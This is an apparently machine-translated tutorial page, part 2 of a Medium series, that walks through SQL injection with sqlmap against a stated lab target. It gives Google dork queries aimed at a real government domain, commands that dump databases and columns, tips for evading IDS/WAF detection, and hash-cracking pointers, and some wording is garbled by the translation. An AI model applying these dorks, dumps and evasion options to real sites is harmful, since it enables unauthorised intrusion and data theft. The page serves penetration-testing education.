<html>
<head>
<title>SQL Injection practical overview (2/2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SQL 注入实践概述(2/2)</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/sql-injection-practical-overview-2-2-5ce6827f63b?source=collection_archive---------10-----------------------#2021-02-13">https://medium.com/nerd-for-tech/sql-injection-practical-overview-2-2-5ce6827f63b?source=collection_archive---------10-----------------------#2021-02-13</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><p id="3524" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">继续这个练习，我们刚刚讨论了<strong class="ih hj"> SQLi </strong>的定义、可能的攻击类型、经典和盲态 SQLi<strong class="ih hj">的工作原理、数据处理及其在 HTTP 中的差异，以及两个实际例子。</strong></p><p id="dbde" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">手动做事情很棒，但是仅仅为了证明一个观点就需要大量的努力，并且根据你的技能，你可以努力尝试得到一个假阳性的场景或者可能跳过一个真实的场景。</p><p id="f0fb" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">有很多工具可以自动化和利用<strong class="ih hj"> SQLi </strong>案例，但这里有几个值得一提，包括:</p><ol class=""><li id="584a" class="jd je hi ih b ii ij im in iq jf iu jg iy jh jc ji jj jk jl bi translated">Acunetix 是一个 web 漏洞分析器，可以识别 URL、字段 ID 和可利用的向量。它还显示了分析过程中出现的元素的描述，还可以向现有的内部<strong class="ih hj"> SQLi </strong>模块发送请求，并通过几次点击获得结果</li><li id="5ea9" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><strong class="ih hj"> sqlmap </strong>(稍后动手)是一个<strong class="ih hj"> CLI </strong>程序，它让你定制查询，以便利用<strong class="ih hj"> SQLi </strong>攻击媒介。这不是一个自动的过程，您必须根据以前的结果来指导您的查询。</li><li id="4591" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated">Havij 是一个面向 Windows 的工具，它允许你在一个丰富的 UI 环境中参数化 IP 地址、目标和请求方法。关于<strong class="ih hj"> Havij </strong>的已知问题是它被认为非常嘈杂，很容易被任何 IDS 检测到。</li><li id="6f45" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated">Burpsuite 是一个出色的工具，它有很多用于 web 分析的特性，其中之一是对 HTTP 请求的嗅探能力。Burpsuite 有一个插件市场，可以让你与其他工具集成以扩展功能。</li></ol><p id="a5ce" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">有了所有可用的工具选项。这里的自然步骤是找到易受攻击的站点。这个过程可以手动完成，但是，在<strong class="ih hj"> Google Hacking </strong>的帮助下，你可以很容易地找到有趣的结果。Google 除了是一个强大的搜索引擎之外，也可以被用作一个易受攻击的或者基础设施搜索引擎。它使用<strong class="ih hj">呆子</strong>，这是用于过滤和检测易受攻击的网站的命令。</p><p id="eb58" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">以下是过滤<strong class="ih hj"> SQLi </strong>易受攻击站点的几个示例:</p><ol class=""><li id="f35c" class="jd je hi ih b ii ij im in iq jf iu jg iy jh jc ji jj jk jl bi translated"><code class="du jr js jt ju b">site:gob.ve SQL error: (MySQL)</code></li><li id="d63a" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">site:gob.ve Warning: obdc_connect()</code></li><li id="5ba3" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">site:gob.ve warning sql</code></li></ol><p id="8b1f" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">如果您能够成功过滤特定的错误描述符，将会显示更好的结果。</p><h1 id="b1a8" class="jv jw hi bd jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks bi translated">现在，重头戏来了！</h1><p id="c09a" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated">至此，我们都知道了什么是 SQLi，如何手动执行，可用的工具，以及如何找到易受攻击的站点。</p><p id="f6e3" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">现在是时候用<code class="du jr js jt ju b">sqlmap</code>弄脏我们的手了。</p><h2 id="2813" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">装置</h2><p id="ceed" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated">Sqlmap 已经预装在 Kali Linux 操作系统中，但是如果您没有使用该操作系统，您可以随时下载它并将其安装在您自己的系统中。这个工具是一个 python 脚本，非常容易安装，你可以去他们的<a class="ae lm" href="http://sqlmap.org/" rel="noopener ugc nofollow" target="_blank">网站</a>或者检查它的 Github <a class="ae lm" href="https://github.com/sqlmapproject/sqlmap" rel="noopener ugc nofollow" target="_blank">库</a>并按照安装步骤进行。</p><h2 id="8806" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">基本命令</h2><p id="3427" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated"><em class="ln">免责声明:为了这个演示，我在一个受控的环境中使用了著名的“我的令人敬畏的照片博客”vuln lab</em></p><ol class=""><li id="7f96" class="jd je hi ih b ii ij im in iq jf iu jg iy jh jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u http://10.0.0.20/cat.php?id=2</code></li><li id="df7d" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql'</code>。<code class="du jr js jt ju b">--dbms</code>选择要使用的数据库管理系统</li><li id="c045" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql' --level='3' --risk='2'</code>“级别”定义了要执行的检查/有效负载的数量，“风险”允许工具使用的有效负载类型，该值高达 3，其中包括繁重的 SQL 查询。</li><li id="b0c0" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql' --level='3' --risk='2' --finger</code>。<code class="du jr js jt ju b">--finger</code>参数让您知道所使用的基础设施的类型</li><li id="f59b" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql' --level='3' --risk='2' --finger --current-user</code>。它是不言自明的，它显示了数据库的当前用户</li><li id="501f" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql' --level='3' --risk='2' --finger --hostname</code>显示服务器的主机名</li></ol><h2 id="1bd7" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">使用数据结构</h2><ol class=""><li id="911b" class="jd je hi ih b ii kt im ku iq lo iu lp iy lq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql' --finger -D 'photoblog' --tables</code>。这个程序选择<code class="du jr js jt ju b">-D</code>(数据库)并显示表格。</li><li id="29e7" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbms='mysql' --finger -D 'photoblog' -T categories --columns --dump</code>。这将选择数据库和名为<code class="du jr js jt ju b">categories</code>的<code class="du jr js jt ju b">-T</code>表，并提示列的结构及其值</li></ol><p id="9b63" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">还可以用<code class="du jr js jt ju b">--dump-all</code>代替<code class="du jr js jt ju b">--dump</code>来提取列的值。如果您正在查询一个带有散列值的表，您可以获取那些值并在<em class="ln">md5checking.com</em>或<em class="ln">crackstation.net</em>中执行检查</p><p id="026f" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">使用<strong class="ih hj"> sqlmap </strong>的一个更简单的方法是使用<code class="du jr js jt ju b">--wizard</code>标志。</p><h2 id="d0b0" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">盲 SQLi 案例</h2><p id="2d54" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated">盲<strong class="ih hj"> SQLi </strong>案例的体验几乎是相同的，一旦您检测到一个易受攻击的参数，您就可以运行<strong class="ih hj"> sqlmap </strong>命令，并且根据返回的任何输出，您可以重复执行，希望成功</p><p id="8045" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">对于<strong class="ih hj"> POST </strong>漏洞利用，我们需要使用<strong class="ih hj"> Burpsuite </strong>或任何可以将请求保存到<code class="du jr js jt ju b">.txt</code>文件中的代理。然后您可以运行带有<code class="du jr js jt ju b">-r</code>标志的<strong class="ih hj"> sqlmap </strong>命令来指向一个特定的文件名，还有<code class="du jr js jt ju b">--current-user</code>标志</p><p id="b644" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这里有一个例子:</p><p id="5044" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated"><code class="du jr js jt ju b">sqlmap -r request.txt --current-user</code></p><h2 id="ed9a" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">经典 SQLi 案例</h2><p id="d58c" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated">Sqlmap 在<code class="du jr js jt ju b">-u</code>标志的帮助下区分<code class="du jr js jt ju b">GET</code>利用案例</p><ol class=""><li id="77e6" class="jd je hi ih b ii ij im in iq jf iu jg iy jh jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> --dbs</code></li><li id="e9c6" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">sqlmap -u <a class="ae lm" href="http://10.0.0.20/cat.php?id=2" rel="noopener ugc nofollow" target="_blank">http://10.0.0.20/cat.php?id=2</a> -D 'photoblog' -T categories -C name,email,phone --dump</code></li></ol><h2 id="7b30" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">避免 IDSs</h2><p id="f64e" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated">在许多情况下，目标基础设施可以拥有类似于<code class="du jr js jt ju b">IDS</code>、<code class="du jr js jt ju b">IPS</code>、<code class="du jr js jt ju b">HDIS</code>、<code class="du jr js jt ju b">WAF</code>的系统，这些系统可以检测到您对<strong class="ih hj"> SQLi </strong>的尝试并被禁止。这对我们来说是个可怕的消息。</p><p id="d57a" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">为了绕过这一点，我们可以应用这一技术来优化所需的参数并避免检测。</p><ol class=""><li id="c554" class="jd je hi ih b ii ij im in iq jf iu jg iy jh jc ji jj jk jl bi translated"><code class="du jr js jt ju b">--delay=5</code>设置延迟会使请求变得更慢，因此 IDS 可以将其视为执行时间方面的一种攻击模式</li><li id="a64e" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">timeout=10</code>在<code class="du jr js jt ju b">10 secs</code>不成功将中止命令的执行</li><li id="2334" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">retriest=2</code>设置失败时连续尝试的次数</li><li id="37a8" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">threads=5</code>线程的使用会分散系统的预期行为</li><li id="5489" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated">避免添加<code class="du jr js jt ju b">-v</code>冗长，这不会改变速度，但需要更多的信息细节</li><li id="1346" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated">使用<code class="du jr js jt ju b">-p</code>并要求某些参数来利用。</li></ol><p id="d52b" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">使请求变慢将试图模拟一个常规请求而不是一个自动请求，后者很容易被阻塞。</p><h2 id="2c05" class="ky jw hi bd jx kz la lb kb lc ld le kf iq lf lg kj iu lh li kn iy lj lk kr ll bi translated">auth 呢？</h2><p id="e273" class="pw-post-body-paragraph if ig hi ih b ii kt ik il im ku io ip iq kv is it iu kw iw ix iy kx ja jb jc hb bi translated">POST 请求倾向于使用身份验证机制，为此，我们可以:</p><p id="0035" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated"><code class="du jr js jt ju b">sqlmap --auth-type=Basic --auth-cred='email:password' --forms -u [URL] ---level=3 --risk=3 --dbs</code></p><p id="e10b" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我们这里有两个新朋友。</p><ol class=""><li id="ce47" class="jd je hi ih b ii ij im in iq jf iu jg iy jh jc ji jj jk jl bi translated"><code class="du jr js jt ju b">--auth-type</code>将设置使用的 HTTP 协议</li><li id="d9c2" class="jd je hi ih b ii jm im jn iq jo iu jp iy jq jc ji jj jk jl bi translated"><code class="du jr js jt ju b">--auth-cred</code>将有一个用于我们攻击的明文注册凭证</li></ol><p id="c212" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这里的一个提示是筛选要评估的参数。</p><p id="c167" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">SQLi 也可以在许多其他工具中执行。<strong class="ih hj"> Burpsuite </strong>有一个名为<strong class="ih hj"> C02 </strong>的扩展，它与<strong class="ih hj"> Sqlmap </strong>相结合，为<strong class="ih hj"> SQLi </strong>创建了一个大规模的集成工具。Acunetix 还在其扫描中包含了<strong class="ih hj"> SQLi </strong>漏洞。</p><p id="88a6" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">所以，这里使用的工具无论在哪里都会抛出相同的结果。</p><p id="70fe" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">黑客快乐:)</p></div></div>    
</body>
</html>